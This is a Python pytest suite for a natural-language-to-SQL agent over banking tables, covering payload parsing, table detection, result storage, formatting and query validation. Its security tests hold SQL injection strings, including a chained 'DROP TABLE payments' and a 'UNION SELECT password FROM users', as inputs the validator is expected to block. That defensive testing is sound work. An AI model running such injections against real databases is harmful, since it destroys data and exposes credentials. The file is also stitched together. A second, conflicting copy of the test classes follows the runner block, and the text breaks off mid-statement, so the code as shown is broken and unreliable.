"""
Comprehensive test suite for the Enhanced Multi-Table NL to SQL Agent with LangGraph
Updated to include query result storage, API interface, and enhanced functionality
"""

import pytest
import os
import sys
import pandas as pd
from unittest.mock import Mock, patch, MagicMock, AsyncMock
import asyncio
from datetime import datetime
import json
import uuid
import hashlib
from decimal import Decimal
import concurrent.futures
import time

# Add the parent directory to the path to import the main module
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import the classes from the main module
try:
    from multi_table_nlsql import (
        InputPayload, TableMapping, AgentState, DatabaseManager, LLMService, 
        DataFormatter, NLToSQLAgent, NLToSQLApp, NLToSQLAPI, QueryResultStorage,
        create_agent, create_api, health_check, setup_database_tables
    )
except ImportError as e:
    # Handle import error gracefully for testing
    print(f"Warning: Could not import main module: {e}")
    
    # Create mock classes for testing if import fails
    class InputPayload:
        def __init__(self, **kwargs):
            for key, value in kwargs.items():
                setattr(self, key, value)
        
        def to_filter_conditions(self):
            return {}
        
        def dict(self):
            return {}
    
    class TableMapping:
        def __init__(self):
            self.table_keywords = {}
        
        def detect_relevant_tables(self, query, payload=None):
            return ['payments']
        
        def get_primary_table(self, tables):
            return 'payments'
    
    # Add other mock classes as needed
    AgentState = Mock
    DatabaseManager = Mock
    LLMService = Mock
    DataFormatter = Mock
    NLToSQLAgent = Mock
    NLToSQLApp = Mock
    NLToSQLAPI = Mock
    QueryResultStorage = Mock
    create_agent = Mock
    create_api = Mock
    health_check = Mock
    setup_database_tables = Mock

class TestInputPayload:
    """Test cases for InputPayload model"""
    
    def test_input_payload_creation(self):
        """Test basic InputPayload creation"""
        payload = InputPayload(
            CIN=22,
            sort_code=123456,
            account_number=900914,
            user_id="user_001"
        )
        
        assert payload.CIN == 22
        assert payload.sort_code == 123456
        assert payload.account_number == 900914
        assert payload.user_id == "user_001"
    
    def test_input_payload_extra_fields(self):
        """Test InputPayload with extra fields"""
        payload = InputPayload(
            CIN=22,
            custom_field="test_value",
            another_field=123
        )
        
        assert payload.CIN == 22
        assert hasattr(payload, 'custom_field')
        assert hasattr(payload, 'another_field')
    
    def test_to_filter_conditions(self):
        """Test conversion to filter conditions"""
        payload = InputPayload(
            CIN=22,
            sort_code=123456,
            account_number=900914,
            user_id="user_001"
        )
        
        conditions = payload.to_filter_conditions()
        
        expected = {
            'customer_id': 22,
            'sort_code': 123456,
            'account_number': 900914,
            'user_id': 'user_001'
        }
        
        assert conditions == expected
    
    def test_empty_payload_conditions(self):
        """Test empty payload conditions"""
        payload = InputPayload()
        conditions = payload.to_filter_conditions()
        assert conditions == {}

class TestTableMapping:
    """Test cases for enhanced table mapping"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.table_mapping = TableMapping()
    
    def test_table_keywords_exist(self):
        """Test that table keywords are properly defined"""
        assert hasattr(self.table_mapping, 'table_keywords')
        assert isinstance(self.table_mapping.table_keywords, dict)
        
        # Check for expected tables
        expected_tables = ['payments', 'categories', 'merchants', 'users', 'budgets', 'accounts']
        for table in expected_tables:
            assert table in self.table_mapping.table_keywords
    
    def test_detect_relevant_tables_basic(self):
        """Test basic table detection"""
        query = "Show my spending"
        tables = self.table_mapping.detect_relevant_tables(query)
        
        assert isinstance(tables, list)
        assert len(tables) > 0
        assert 'payments' in tables  # Should detect payments from 'spending'
    
    def test_detect_relevant_tables_with_payload(self):
        """Test table detection with payload"""
        payload = InputPayload(CIN=22, account_number=900914)
        query = "Show my spending"
        
        tables = self.table_mapping.detect_relevant_tables(query, payload)
        
        # Should detect payments (from keywords) and possibly accounts (from payload)
        assert 'payments' in tables
        assert isinstance(tables, list)
    
    def test_get_primary_table(self):
        """Test primary table selection"""
        tables = ['categories', 'merchants', 'payments']
        primary = self.table_mapping.get_primary_table(tables)
        assert primary == 'payments'  # Highest priority
        
        tables = ['categories', 'merchants']
        primary = self.table_mapping.get_primary_table(tables)
        assert primary in tables  # Should return one of the tables

class TestQueryResultStorage:
    """Test cases for QueryResultStorage functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.mock_db_manager = Mock()
        self.mock_engine = Mock()
        self.mock_db_manager.engine = self.mock_engine
        
        # Mock the storage initialization
        with patch.object(QueryResultStorage, '_ensure_results_table_exists'):
            self.storage = QueryResultStorage(self.mock_db_manager)
    
    def test_store_query_result_success(self):
        """Test successful query result storage"""
        # Mock database connection and execution
        mock_connection = Mock()
        mock_result = Mock()
        mock_result.fetchone.return_value = [123]  # result_id
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        self.mock_engine.connect.return_value = mock_connection
        
        result_data = {
            'query': 'Test query',
            'user_id': 'user_001',
            'input_payload': {'CIN': 22},
            'sql_query': 'SELECT * FROM payments',
            'relevant_tables': ['payments'],
            'primary_table': 'payments',
            'success': True,
            'formatted_data': {'data': [{'amount': 100}]},
            'row_count': 1
        }
        
        result_id = self.storage.store_query_result(result_data, 250, 'session_123')
        
        assert result_id == 123
        mock_connection.execute.assert_called()
        mock_connection.commit.assert_called()
    
    def test_get_query_results(self):
        """Test retrieving query results"""
        # Mock database connection and results
        mock_connection = Mock()
        mock_result = Mock()
        mock_row = Mock()
        mock_row._mapping = {
            'result_id': 1,
            'user_id': 'user_001',
            'user_query': 'Test query',
            'input_payload': '{"CIN": 22}',
            'sql_query': 'SELECT * FROM payments',
            'relevant_tables': ['payments'],
            'success': True,
            'formatted_data': '{"data": []}',
            'created_at': datetime.now()
        }
        mock_result.fetchall.return_value = [mock_row]
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        self.mock_engine.connect.return_value = mock_connection
        
        results = self.storage.get_query_results(user_id='user_001', limit=10)
        
        assert len(results) == 1
        assert results[0]['result_id'] == 1
        assert results[0]['user_id'] == 'user_001'

class TestAgentState:
    """Test cases for enhanced AgentState model"""
    
    def test_agent_state_creation(self):
        """Test basic AgentState creation"""
        payload = InputPayload(CIN=22, user_id="test_user")
        
        state = AgentState(
            user_query="Test query",
            input_payload=payload,
            user_id="123"
        )
        
        assert state.user_query == "Test query"
        assert state.input_payload == payload
        assert state.user_id == "123"
    
    def test_agent_state_defaults(self):
        """Test AgentState default values"""
        state = AgentState()
        
        assert state.user_query == ""
        assert state.input_payload is None
        assert state.relevant_tables == []
        assert state.error_message == ""
        assert state.retry_count == 0

class TestDatabaseManager:
    """Test cases for enhanced DatabaseManager"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.create_engine'):
            self.db_manager = DatabaseManager("sqlite:///:memory:")
    
    def test_initialization(self):
        """Test DatabaseManager initialization"""
        assert self.db_manager.database_url == "sqlite:///:memory:"
        assert hasattr(self.db_manager, 'table_mapping')
    
    def test_validate_query_security(self):
        """Test SQL query security validation"""
        # Test dangerous keywords
        dangerous_queries = [
            "SELECT * FROM payments; DROP TABLE users;",
            "UPDATE payments SET amount = 0",
            "DELETE FROM payments WHERE id = 1"
        ]
        
        for query in dangerous_queries:
            result = self.db_manager.validate_query(query, {})
            assert result['is_valid'] is False
            assert len(result['errors']) > 0
        
        # Test safe query
        safe_query = "SELECT * FROM payments WHERE user_id = 'user_001'"
        result = self.db_manager.validate_query(safe_query, {})
        assert result['is_valid'] is True

class TestLLMService:
    """Test cases for enhanced LLMService"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            with patch('multi_table_nlsql.OpenAI'):
                self.llm_service = LLMService("test-api-key")
    
    def test_initialization(self):
        """Test LLMService initialization"""
        assert hasattr(self.llm_service, 'client')
        assert hasattr(self.llm_service, 'table_mapping')
    
    def test_build_payload_context(self):
        """Test payload context building"""
        payload = InputPayload(CIN=22, account_number=900914)
        
        context = self.llm_service._build_payload_context(payload, ['payments'])
        
        assert isinstance(context, str)
        assert 'customer_id = 22' in context
        assert 'account_number = 900914' in context
    
    def test_build_payload_context_empty(self):
        """Test payload context with no payload"""
        context = self.llm_service._build_payload_context(None, ['payments'])
        
        assert isinstance(context, str)
        assert 'No external payload provided' in context

class TestDataFormatter:
    """Test cases for DataFormatter"""
    
    def test_format_for_visualization_basic(self):
        """Test basic data formatting for visualization"""
        data = pd.DataFrame({
            'category': ['Food', 'Entertainment', 'Transport'],
            'amount': [100, 50, 30]
        })
        
        query_info = {
            'query': 'Test query',
            'sql_query': 'SELECT * FROM test'
        }
        
        result = DataFormatter.format_for_visualization(data, query_info)
        
        assert result['status'] == 'success'
        assert result['metadata']['row_count'] == 3
        assert result['metadata']['column_count'] == 2
        assert len(result['data']) == 3
        assert 'suggested_charts' in result['metadata']
    
    def test_format_empty_data(self):
        """Test formatting empty data"""
        data = pd.DataFrame()
        query_info = {'query': 'Test query'}
        
        result = DataFormatter.format_for_visualization(data, query_info)
        
        assert result['status'] == 'success'
        assert result['metadata']['row_count'] == 0
        assert result['data'] == []
    
    def test_suggest_chart_types(self):
        """Test chart type suggestions"""
        # Test categorical + numeric data
        data = pd.DataFrame({
            'category': ['A', 'B', 'C'],
            'value': [10, 20, 30]
        })
        
        suggestions = DataFormatter._suggest_chart_types(data)
        assert isinstance(suggestions, list)
        assert len(suggestions) > 0

class TestNLToSQLAgent:
    """Test cases for the enhanced NLToSQLAgent with LangGraph"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.OpenAI'), \
             patch('multi_table_nlsql.StateGraph'), \
             patch.object(QueryResultStorage, '_ensure_results_table_exists'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    def test_agent_initialization(self):
        """Test agent initialization"""
        assert self.agent.db_manager is not None
        assert self.agent.llm_service is not None
        assert self.agent.table_mapping is not None
        assert self.agent.data_formatter is not None
        assert self.agent.result_storage is not None
    
    def test_analyze_query_node(self):
        """Test query analysis node"""
        state = AgentState(user_query="Show spending by category")
        
        result_state = self.agent.analyze_query_node(state)
        
        assert isinstance(result_state.relevant_tables, list)
        assert len(result_state.relevant_tables) > 0
        assert result_state.primary_table != ""

class TestNLToSQLApp:
    """Test cases for the enhanced application interface"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.NLToSQLAgent'), \
             patch('multi_table_nlsql.load_dotenv'), \
             patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            with patch.object(NLToSQLApp, 'setup_environment'):
                self.app = NLToSQLApp()
                self.app.session_id = str(uuid.uuid4())
    
    def test_parse_payload_input_valid_json(self):
        """Test parsing valid JSON payload from input"""
        user_input = "Show payments for {'CIN': 22, 'account_number': 900914}"
        
        payload = self.app.parse_payload_input(user_input)
        
        if payload is not None:  # Only test if parsing succeeded
            assert payload.CIN == 22
            assert payload.account_number == 900914
    
    def test_parse_payload_input_invalid_json(self):
        """Test parsing invalid JSON payload from input"""
        user_input = "Show payments without any JSON"
        
        payload = self.app.parse_payload_input(user_input)
        
        assert payload is None
    
    def test_session_id_exists(self):
        """Test session ID exists"""
        assert self.app.session_id is not None
        assert isinstance(self.app.session_id, str)

class TestNLToSQLAPI:
    """Test cases for the NLToSQLAPI interface"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.NLToSQLAgent') as mock_agent_class:
            mock_agent = Mock()
            mock_agent_class.return_value = mock_agent
            mock_agent.db_manager.connect.return_value = None
            
            self.api = NLToSQLAPI("sqlite:///:memory:", "test-key")
            self.mock_agent = mock_agent
    
    @pytest.mark.asyncio
    async def test_api_query_validation_error(self):
        """Test API query validation error"""
        request_data = {}  # Missing required query
        
        result = await self.api.query(request_data)
        
        assert result['success'] is False
        assert result['error_type'] == 'validation_error'
        assert 'Query parameter is required' in result['error_message']
    
    def test_get_query_history_api(self):
        """Test API query history retrieval"""
        mock_results = [
            {'result_id': 1, 'user_query': 'Query 1'},
            {'result_id': 2, 'user_query': 'Query 2'}
        ]
        self.mock_agent.result_storage.get_query_results.return_value = mock_results
        
        result = self.api.get_query_history(user_id='user_001', limit=10)
        
        assert result['success'] is True
        assert len(result['data']) == 2
        assert result['count'] == 2

# Test Configuration and Fixtures
@pytest.fixture
def sample_payload():
    """Fixture for sample payload data"""
    return InputPayload(CIN=22, account_number=900914, sort_code=123456)

@pytest.fixture
def sample_query_result():
    """Fixture for sample query result"""
    return {
        'query': 'Show my payments',
        'user_id': 'user_001',
        'input_payload': {'CIN': 22},
        'sql_query': 'SELECT * FROM payments WHERE customer_id = 22',
        'relevant_tables': ['payments'],
        'primary_table': 'payments',
        'success': True,
        'formatted_data': {'data': [{'amount': 100}, {'amount': 200}]},
        'row_count': 2,
        'execution_time_ms': 150
    }

# Performance Tests
class TestPerformance:
    """Performance and scalability tests"""
    
    @pytest.mark.performance
    def test_large_dataset_formatting(self):
        """Test data formatting performance with large datasets"""
        # Create large dataset
        large_data = pd.DataFrame({
            'category': ['Food'] * 1000 + ['Entertainment'] * 1000,
            'amount': list(range(2000))
        })
        
        query_info = {'query': 'Performance test'}
        
        start_time = time.time()
        result = DataFormatter.format_for_visualization(large_data, query_info)
        end_time = time.time()
        
        # Should complete within reasonable time
        assert end_time - start_time < 5.0  # Less than 5 seconds
        assert result['metadata']['row_count'] == 2000
        assert len(result['data']) == 2000

# Security Tests
class TestSecurity:
    """Security-focused tests"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        with patch('multi_table_nlsql.create_engine'):
            db_manager = DatabaseManager("sqlite:///:memory:")
        
        malicious_queries = [
            "SELECT * FROM payments WHERE user_id = '1'; DROP TABLE payments; --",
            "SELECT * FROM payments UNION SELECT password FROM users",
        ]
        
        for query in malicious_queries:
            result = db_manager.validate_query(query, {})
            assert result['is_valid'] is False, f"Query should be blocked: {query}"
            assert len(result['errors']) > 0

# Parameterized Tests
class TestParameterizedScenarios:
    """Parameterized tests for various payload and query combinations"""
    
    @pytest.mark.parametrize("payload_dict,expected_keys", [
        ({"CIN": 22}, ["customer_id"]),
        ({"sort_code": 123456}, ["sort_code"]),
        ({"account_number": 900914}, ["account_number"]),
        ({"user_id": "user_001"}, ["user_id"]),
        ({}, []),
    ])
    def test_payload_to_filter_conditions(self, payload_dict, expected_keys):
        """Test payload conversion to filter conditions"""
        payload = InputPayload(**payload_dict)
        conditions = payload.to_filter_conditions()
        
        for key in expected_keys:
            assert key in conditions

# Edge Cases Tests
class TestEdgeCases:
    """Test edge cases and error conditions"""
    
    def test_empty_payload_conditions(self):
        """Test empty payload conditions"""
        payload = InputPayload()
        conditions = payload.to_filter_conditions()
        assert conditions == {}
    
    def test_none_values_in_payload(self):
        """Test payload with None values"""
        payload = InputPayload(CIN=None, account_number=900914, sort_code=None)
        conditions = payload.to_filter_conditions()
        
        # None values should be excluded
        assert 'customer_id' not in conditions
        assert 'sort_code' not in conditions
        assert conditions.get('account_number') == 900914

# Test Summary and Validation
class TestSummary:
    """Test summary and configuration validation"""
    
    def test_basic_imports(self):
        """Verify basic imports work"""
        import pandas
        import pytest
        import json
        
        assert pandas is not None
        assert pytest is not None
        assert json is not None

# Test runner configuration
if __name__ == "__main__":
    # Run tests with basic configuration
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-x",  # Stop on first failure for debugging
    ])
    """Test cases for InputPayload model"""
    
    def test_input_payload_creation(self):
        """Test basic InputPayload creation"""
        payload = InputPayload(
            CIN=22,
            sort_code=123456,
            account_number=900914,
            user_id="user_001"
        )
        
        assert payload.CIN == 22
        assert payload.sort_code == 123456
        assert payload.account_number == 900914
        assert payload.user_id == "user_001"
    
    def test_input_payload_extra_fields(self):
        """Test InputPayload with extra fields"""
        payload = InputPayload(
            CIN=22,
            custom_field="test_value",
            another_field=123
        )
        
        assert payload.CIN == 22
        assert hasattr(payload, 'custom_field')
        assert hasattr(payload, 'another_field')
    
    def test_to_filter_conditions(self):
        """Test conversion to filter conditions"""
        payload = InputPayload(
            CIN=22,
            sort_code=123456,
            account_number=900914,
            user_id="user_001"
        )
        
        conditions = payload.to_filter_conditions()
        
        expected = {
            'customer_id': 22,
            'sort_code': 123456,
            'account_number': 900914,
            'user_id': 'user_001'
        }
        
        assert conditions == expected
    
    def test_empty_payload_conditions(self):
        """Test empty payload conditions"""
        payload = InputPayload()
        conditions = payload.to_filter_conditions()
        assert conditions == {}

class TestTableMapping:
    """Test cases for enhanced table mapping"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.table_mapping = TableMapping()
    
    def test_detect_relevant_tables_with_payload(self):
        """Test table detection with payload"""
        payload = InputPayload(CIN=22, account_number=900914)
        query = "Show my spending"
        
        tables = self.table_mapping.detect_relevant_tables(query, payload)
        
        # Should detect payments (from keywords) and accounts (from payload)
        assert 'payments' in tables
        assert 'accounts' in tables
    
    def test_detect_relevant_tables_accounts(self):
        """Test detection of account-related queries"""
        queries = [
            "What's my account balance?",
            "Show bank statement",
            "Check account details"
        ]
        
        for query in queries:
            tables = self.table_mapping.detect_relevant_tables(query)
            assert 'accounts' in tables, f"Failed to detect accounts table for: {query}"
    
    def test_payload_columns_mapping(self):
        """Test payload columns are correctly mapped"""
        payments_info = self.table_mapping.table_keywords['payments']
        assert 'customer_id' in payments_info['payload_columns']
        assert 'account_number' in payments_info['payload_columns']
        assert 'sort_code' in payments_info['payload_columns']
        
        accounts_info = self.table_mapping.table_keywords['accounts']
        assert 'account_number' in accounts_info['payload_columns']
        assert 'sort_code' in accounts_info['payload_columns']
    
    def test_get_join_condition(self):
        """Test JOIN condition retrieval"""
        join_condition = self.table_mapping.get_join_condition('payments', 'categories')
        assert join_condition == 'payments.category_id = categories.category_id'
        
        # Test reverse order
        join_condition = self.table_mapping.get_join_condition('categories', 'payments')
        assert join_condition == 'payments.category_id = categories.category_id'
    
    def test_get_primary_table(self):
        """Test primary table selection"""
        tables = ['categories', 'merchants', 'payments']
        primary = self.table_mapping.get_primary_table(tables)
        assert primary == 'payments'  # Highest priority
        
        tables = ['categories', 'merchants']
        primary = self.table_mapping.get_primary_table(tables)
        assert primary == 'categories'

class TestQueryResultStorage:
    """Test cases for QueryResultStorage functionality"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.mock_db_manager = Mock()
        self.mock_engine = Mock()
        self.mock_db_manager.engine = self.mock_engine
        self.storage = QueryResultStorage(self.mock_db_manager)
    
    def test_store_query_result_success(self):
        """Test successful query result storage"""
        # Mock database connection and execution
        mock_connection = Mock()
        mock_result = Mock()
        mock_result.fetchone.return_value = [123]  # result_id
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        self.mock_engine.connect.return_value = mock_connection
        
        result_data = {
            'query': 'Test query',
            'user_id': 'user_001',
            'input_payload': {'CIN': 22},
            'sql_query': 'SELECT * FROM payments',
            'relevant_tables': ['payments'],
            'primary_table': 'payments',
            'success': True,
            'formatted_data': {'data': [{'amount': 100}]},
            'row_count': 1
        }
        
        result_id = self.storage.store_query_result(result_data, 250, 'session_123')
        
        assert result_id == 123
        mock_connection.execute.assert_called()
        mock_connection.commit.assert_called()
    
    def test_get_query_results(self):
        """Test retrieving query results"""
        # Mock database connection and results
        mock_connection = Mock()
        mock_result = Mock()
        mock_row = Mock()
        mock_row._mapping = {
            'result_id': 1,
            'user_id': 'user_001',
            'user_query': 'Test query',
            'input_payload': '{"CIN": 22}',
            'sql_query': 'SELECT * FROM payments',
            'relevant_tables': ['payments'],
            'success': True,
            'formatted_data': '{"data": []}',
            'created_at': datetime.now()
        }
        mock_result.fetchall.return_value = [mock_row]
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        self.mock_engine.connect.return_value = mock_connection
        
        results = self.storage.get_query_results(user_id='user_001', limit=10)
        
        assert len(results) == 1
        assert results[0]['result_id'] == 1
        assert results[0]['user_id'] == 'user_001'
    
    def test_get_query_statistics(self):
        """Test retrieving query statistics"""
        mock_connection = Mock()
        mock_result = Mock()
        mock_row = Mock()
        mock_row._mapping = {
            'total_queries': 10,
            'successful_queries': 8,
            'failed_queries': 2,
            'avg_execution_time_ms': 150.5,
            'avg_rows_returned': 25.3
        }
        mock_result.fetchone.return_value = mock_row
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        self.mock_engine.connect.return_value = mock_connection
        
        stats = self.storage.get_query_statistics('user_001')
        
        assert stats['total_queries'] == 10
        assert stats['successful_queries'] == 8
        assert stats['avg_execution_time_ms'] == 150.5

class TestAgentState:
    """Test cases for enhanced AgentState model"""
    
    def test_agent_state_with_payload(self):
        """Test AgentState with InputPayload"""
        payload = InputPayload(CIN=22, user_id="test_user")
        
        state = AgentState(
            user_query="Test query",
            input_payload=payload,
            user_id="123"
        )
        
        assert state.user_query == "Test query"
        assert state.input_payload == payload
        assert state.user_id == "123"
        assert state.formatted_data is None
    
    def test_agent_state_dict_compatibility(self):
        """Test AgentState dict-like interface for LangGraph"""
        state = AgentState(user_query="Test", retry_count=1)
        
        # Test dict-like access
        assert state['user_query'] == "Test"
        assert state.get('retry_count') == 1
        assert state.get('nonexistent', 'default') == 'default'
        
        # Test dict-like assignment
        state['sql_query'] = "SELECT * FROM test"
        assert state.sql_query == "SELECT * FROM test"
    
    def test_user_id_conversion(self):
        """Test user_id string conversion"""
        state = AgentState(user_id=123)
        assert state.user_id == "123"
        assert isinstance(state.user_id, str)

class TestDatabaseManager:
    """Test cases for enhanced DatabaseManager"""
    
    def setup_method(self):
        """Setup test fixtures"""
        self.db_manager = DatabaseManager("sqlite:///:memory:")
    
    def test_enhanced_schema_info(self):
        """Test enhanced schema information retrieval"""
        with patch('multi_table_nlsql.inspect') as mock_inspect:
            mock_inspector = Mock()
            mock_inspect.return_value = mock_inspector
            mock_inspector.get_table_names.return_value = ['payments', 'accounts']
            mock_inspector.get_columns.return_value = [
                {'name': 'id', 'type': 'INTEGER', 'nullable': False, 'primary_key': True},
                {'name': 'amount', 'type': 'DECIMAL', 'nullable': False}
            ]
            mock_inspector.get_foreign_keys.return_value = []
            mock_inspector.get_indexes.return_value = []
            
            self.db_manager.engine = Mock()
            
            schema_info = self.db_manager.get_schema_info(['payments'])
            
            assert 'payments' in schema_info
            assert 'table_info' in schema_info['payments']
            assert 'payload_columns' in schema_info['payments']['table_info']
    
    def test_get_user_list(self):
        """Test retrieving user list from database"""
        mock_connection = Mock()
        mock_result = Mock()
        mock_result.fetchall.return_value = [('user_001',), ('user_002',), ('user_003',)]
        mock_connection.execute.return_value = mock_result
        mock_connection.__enter__ = Mock(return_value=mock_connection)
        mock_connection.__exit__ = Mock(return_value=None)
        
        self.db_manager.engine = Mock()
        self.db_manager.engine.connect.return_value = mock_connection
        
        users = self.db_manager.get_user_list()
        
        assert users == ['user_001', 'user_002', 'user_003']
    
    def test_validate_query_security(self):
        """Test SQL query security validation"""
        # Test dangerous keywords
        dangerous_queries = [
            "SELECT * FROM payments; DROP TABLE users;",
            "UPDATE payments SET amount = 0",
            "DELETE FROM payments WHERE id = 1"
        ]
        
        for query in dangerous_queries:
            result = self.db_manager.validate_query(query, {})
            assert result['is_valid'] is False
            assert len(result['errors']) > 0
        
        # Test safe query
        safe_query = "SELECT * FROM payments WHERE user_id = 'user_001'"
        result = self.db_manager.validate_query(safe_query, {})
        assert result['is_valid'] is True

class TestLLMService:
    """Test cases for enhanced LLMService"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch.dict(os.environ, {'OPENAI_API_KEY': 'test-key'}):
            self.llm_service = LLMService("test-api-key")
    
    def test_build_payload_context(self):
        """Test payload context building"""
        payload = InputPayload(CIN=22, account_number=900914)
        
        context = self.llm_service._build_payload_context(payload, ['payments'])
        
        assert 'customer_id = 22' in context
        assert 'account_number = 900914' in context
        assert 'HIGHEST PRIORITY' in context
    
    def test_build_payload_context_empty(self):
        """Test payload context with no payload"""
        context = self.llm_service._build_payload_context(None, ['payments'])
        
        assert 'No external payload provided' in context
    
    def test_build_user_context(self):
        """Test user context building"""
        context = self.llm_service._build_user_context('user_001', ['payments', 'accounts'])
        
        assert 'user_001' in context
        assert 'payments, accounts' in context
        assert "user_id = 'user_001'" in context
    
    def test_build_relationship_context(self):
        """Test table relationship context building"""
        context = self.llm_service._build_relationship_context(['payments', 'categories'])
        
        assert 'payments ↔ categories' in context
        assert 'payments.category_id = categories.category_id' in context
    
    @patch('multi_table_nlsql.OpenAI')
    def test_generate_sql_with_payload(self, mock_openai_class):
        """Test SQL generation with payload"""
        mock_client = Mock()
        mock_openai_class.return_value = mock_client
        
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "SELECT * FROM payments WHERE customer_id = 22"
        mock_client.chat.completions.create.return_value = mock_response
        
        self.llm_service.client = mock_client
        self.llm_service.use_legacy = False
        
        schema_info = {
            'payments': {
                'columns': [{'name': 'id', 'type': 'INTEGER'}],
                'table_info': {'description': 'Payment data'}
            }
        }
        
        payload = InputPayload(CIN=22)
        
        result = self.llm_service.generate_sql(
            "Show payments", 
            schema_info, 
            ['payments'], 
            'payments',
            None,
            payload
        )
        
        assert "customer_id = 22" in result

class TestDataFormatter:
    """Test cases for DataFormatter"""
    
    def test_format_for_visualization_basic(self):
        """Test basic data formatting for visualization"""
        data = pd.DataFrame({
            'category': ['Food', 'Entertainment', 'Transport'],
            'amount': [100, 50, 30]
        })
        
        query_info = {
            'query': 'Test query',
            'sql_query': 'SELECT * FROM test'
        }
        
        result = DataFormatter.format_for_visualization(data, query_info)
        
        assert result['status'] == 'success'
        assert result['metadata']['row_count'] == 3
        assert result['metadata']['column_count'] == 2
        assert len(result['data']) == 3
        assert 'suggested_charts' in result['metadata']
    
    def test_format_empty_data(self):
        """Test formatting empty data"""
        data = pd.DataFrame()
        query_info = {'query': 'Test query'}
        
        result = DataFormatter.format_for_visualization(data, query_info)
        
        assert result['status'] == 'success'
        assert result['metadata']['row_count'] == 0
        assert result['data'] == []
    
    def test_suggest_chart_types(self):
        """Test chart type suggestions"""
        # Test categorical + numeric data
        data = pd.DataFrame({
            'category': ['A', 'B', 'C'],
            'value': [10, 20, 30]
        })
        
        suggestions = DataFormatter._suggest_chart_types(data)
        assert 'bar_chart' in suggestions or 'horizontal_bar_chart' in suggestions
        
        # Test numeric only data
        data = pd.DataFrame({
            'value': [10, 20, 30, 25, 15]
        })
        
        suggestions = DataFormatter._suggest_chart_types(data)
        assert 'histogram' in suggestions or 'box_plot' in suggestions

class TestNLToSQLAgent:
    """Test cases for the enhanced NLToSQLAgent with LangGraph"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.OpenAI'):
            self.agent = NLToSQLAgent("sqlite:///:memory:", "test-api-key")
    
    def test_agent_initialization_with_langgraph(self):
        """Test agent initialization with LangGraph components"""
        assert self.agent.db_manager is not None
        assert self.agent.llm_service is not None
        assert self.agent.table_mapping is not None
        assert self.agent.data_formatter is not None
        assert self.agent.result_storage is not None
        assert self.agent.graph is not None
    
    def test_analyze_query_node_with_payload(self):
        """Test query analysis node with payload"""
        payload = InputPayload(CIN=22, account_number=900914)
        state = AgentState(
            user_query="Show spending by category",
            input_payload=payload
        )
        
        result_state = self.agent.analyze_query_node(state)
        
        assert 'categories' in result_state.relevant_tables
        assert 'payments' in result_state.relevant_tables
        assert 'accounts' in result_state.relevant_tables  # From payload
        assert result_state.primary_table == 'payments'
    
    def test_format_results_node(self):
        """Test results formatting node"""
        test_data = pd.DataFrame({
            'category': ['Food', 'Transport'],
            'amount': [100, 50]
        })
        
        payload = InputPayload(CIN=22)
        state = AgentState(
            user_query="Test query",
            sql_query="SELECT * FROM test",
            execution_result=test_data,
            input_payload=payload,
            relevant_tables=['payments'],
            primary_table='payments'
        )
        
        result_state = self.agent.format_results_node(state)
        
        assert result_state.formatted_data is not None
        assert result_state.formatted_data['status'] == 'success'
        assert len(result_state.formatted_data['data']) == 2
        assert 'suggested_charts' in result_state.formatted_data['metadata']
    
    @pytest.mark.asyncio
    async def test_process_query_with_payload_dict(self):
        """Test complete query processing with payload as dict"""
        # Mock all the dependencies
        with patch.object(self.agent.db_manager, 'get_schema_info') as mock_schema, \
             patch.object(self.agent.llm_service, 'generate_sql') as mock_generate, \
             patch.object(self.agent.db_manager, 'validate_query') as mock_validate, \
             patch.object(self.agent.db_manager, 'execute_query') as mock_execute, \
             patch.object(self.agent.result_storage, 'store_query_result') as mock_store:
            
            # Setup mocks
            mock_schema.return_value = {'payments': {'columns': []}}
            mock_generate.return_value = "SELECT * FROM payments WHERE customer_id = 22"
            mock_validate.return_value = {'is_valid': True}
            mock_execute.return_value = pd.DataFrame({'amount': [100, 200]})
            mock_store.return_value = 123
            
            # Execute with dict payload
            payload_dict = {'CIN': 22, 'sort_code': None, 'account_number': 900914, 'user_id': None}
            result = await self.agent.process_query("Show my payments", "123", payload_dict)
            
            # Verify results
            assert result['success'] is True
            assert result['input_payload'] == payload_dict
            assert result['sql_query'] == "SELECT * FROM payments WHERE customer_id = 22"
            assert result['row_count'] == 2
            assert result['result_id'] == 123
    
    @pytest.mark.asyncio
    async def test_process_query_error_handling(self):
        """Test error handling in query processing"""
        # Mock to raise an exception
        with patch.object(self.agent.table_mapping, 'detect_relevant_tables', side_effect=Exception("Test error")):
            result = await self.agent.process_query("Test query")
            
            assert result['success'] is False
            assert "Processing error" in result['error_message']

class TestNLToSQLApp:
    """Test cases for the enhanced application interface"""
    
    def setup_method(self):
        """Setup test fixtures"""
        with patch('multi_table_nlsql.NLToSQLAgent'), \
             patch('multi_table_nlsql.load_dotenv'), \
